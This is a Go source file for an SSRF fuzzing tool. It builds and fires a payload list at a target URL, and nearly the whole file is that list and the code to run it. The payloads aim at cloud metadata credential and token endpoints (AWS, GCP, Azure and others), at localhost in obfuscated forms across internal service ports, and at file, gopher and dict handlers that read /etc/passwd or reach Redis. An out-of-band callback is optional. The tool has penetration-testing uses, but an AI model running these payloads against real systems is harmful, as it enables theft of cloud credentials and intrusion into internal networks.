package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"

	"go-ssrf-fuzzer/fuzzer"
)

func main() {
	urlFlag := flag.String("u", "", "Target URL with FUZZ marker")
	concurrency := flag.Int("c", 50, "Concurrency")
	timeout := flag.Int("t", 5, "Timeout in seconds")
	headers := flag.String("H", "", "Headers (k:v,k:v)")
	oobURL := flag.String("oob", "", "OOB Callback URL")
	includeCloud := flag.Bool("cloud", true, "Include cloud metadata payloads")
	includeInternal := flag.Bool("internal", true, "Include internal network payloads")
	includeProtocols := flag.Bool("protocols", true, "Include protocol handler payloads (file, etc)")
	jsonOutput := flag.Bool("json", true, "Output as JSON")
	includeGCP := flag.Bool("gcp", true, "Include GCP metadata payloads")
	includeIMDSv2 := flag.Bool("imdsv2", true, "Attempt AWS IMDSv2 token retrieval")
	includeKube := flag.Bool("kube", true, "Include Kubernetes payloads")
	includeDocker := flag.Bool("docker", true, "Include Docker payloads")
	includeECS := flag.Bool("ecs", true, "Include ECS payloads")
	includeMesh := flag.Bool("mesh", true, "Include Service Mesh payloads")

	flag.Parse()

	if *urlFlag == "" {
		fmt.Fprintln(os.Stderr, "Error: -u (URL) is required")
		os.Exit(1)
	}

	// Build Payload List
	var payloads []string

	if *includeCloud {
		payloads = append(payloads, []string{
			"http://169.254.169.254/latest/meta-data/",
			"http://169.254.169.254/latest/user-data/",
			"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
			"http://metadata.google.internal/computeMetadata/v1/",
			"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
			"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
			"http://100.100.100.200/latest/meta-data/", // Alibaba
			"http://169.254.169.254/opc/v1/instance/",  // Oracle
		}...)
	}

	if *includeInternal {
		localhosts := []string{"127.0.0.1", "localhost", "0", "127.1", "127.0.0.1.nip.io", "[::1]", "0x7f000001"}
		ports := []string{"80", "443", "8080", "8443", "6379", "3306", "5432", "9000", "9200", "22", "23", "25"}

		for _, host := range localhosts {
			payloads = append(payloads, "http://"+host+"/")
			for _, port := range ports {
				payloads = append(payloads, "http://"+host+":"+port+"/")
			}
		}

		// Common internal subnets
		payloads = append(payloads, []string{
			"http://10.0.0.1/", "http://172.16.0.1/", "http://192.168.0.1/", "http://192.168.1.1/",
		}...)
	}

	if *includeProtocols {
		payloads = append(payloads, []string{
			"file:///etc/passwd",
			"file://C:/Windows/win.ini",
			"dict://127.0.0.1:6379/info",
			"gopher://127.0.0.1:6379/_info",
			"ftp://127.0.0.1:21",
		}...)
	}

	if *oobURL != "" {
		payloads = append(payloads, *oobURL)
		payloads = append(payloads, strings.Replace(*oobURL, "http", "https", 1))
	}

	// Parse Headers
	headerMap := make(map[string]string)
	if *headers != "" {
		for _, h := range strings.Split(*headers, ",") {
			parts := strings.SplitN(h, ":", 2)
			if len(parts) == 2 {
				headerMap[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
			}
		}
	}

	config := fuzzer.Config{
		URL:           *urlFlag,
		Payloads:      payloads,
		Concurrency:   *concurrency,
		Timeout:       time.Duration(*timeout) * time.Second,
		Headers:       headerMap,
		OOBURL:        *oobURL,
		IncludeGCP:    *includeGCP,
		AttemptIMDSv2: *includeIMDSv2,
		IncludeKube:   *includeKube,
		IncludeDocker: *includeDocker,
		IncludeECS:    *includeECS,
		IncludeMesh:   *includeMesh,
	}

	result := fuzzer.Run(config)

	if *jsonOutput {
		out, _ := json.MarshalIndent(result, "", "  ")
		fmt.Println(string(out))
	} else {
		fmt.Printf("SSRF Scan finished. Hits found: %d\n", len(result.Hits))
		for _, h := range result.Hits {
			fmt.Printf("[%s] %s -> %s\n", h.Severity, h.Payload, h.Reason)
		}
	}
}
